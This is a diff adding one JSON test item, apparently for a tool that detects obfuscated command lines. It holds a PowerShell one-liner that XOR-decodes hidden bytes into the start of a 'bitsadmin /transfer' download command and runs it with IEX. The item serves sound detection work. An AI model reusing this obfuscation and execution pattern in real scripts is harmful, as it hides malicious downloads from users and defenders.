@@ -1,0 +1,10 @@
+{
+  "id": "ps-xor-ascii-9-mut1",
+  "category": "ps-xor-inline",
+  "command_line": "$k=[System.Text.Encoding]::ASCII.GetBytes('s0meK3y'); $b=[byte[]](17,89,25,22,42,87,20,26,94,77,74,63,65,24,29,67,11,0,57); $d=-join(0..($b.Length-1)|%{[char]($b[$_] -bxor $k[$_ % $k.Length])}); IEX $d\n# comment-1",
+  "expected_keywords": [
+    "bitsadmin"
+  ],
+  "source": "nivxray-rc40-obfuscation",
+  "license": "CC-BY-4.0"
+}
